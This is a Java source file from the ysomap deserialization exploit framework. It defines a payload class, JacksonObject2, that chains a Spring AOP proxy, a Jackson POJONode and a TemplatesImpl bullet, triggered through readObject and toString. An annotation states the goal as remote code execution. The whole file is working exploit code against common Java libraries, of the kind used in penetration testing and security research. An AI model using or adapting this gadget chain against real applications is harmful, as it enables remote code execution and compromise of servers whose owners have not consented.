package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

import javax.xml.transform.Templates;

/**
 * @author whocansee
 * @since 2023/10/7
 * https://xz.aliyun.com/t/12846
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Dependencies({"spring-aop", "jackson"})
@Details("jackson & spring-aop trigger templates to rce")
public class JacksonObject2 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object proxy = PayloadHelper.makeSpringAOPProxy(Templates.class, obj);;
        POJONode node = new POJONode(proxy);
        return PayloadHelper.makeReadObjectToStringTrigger(node);
    }
}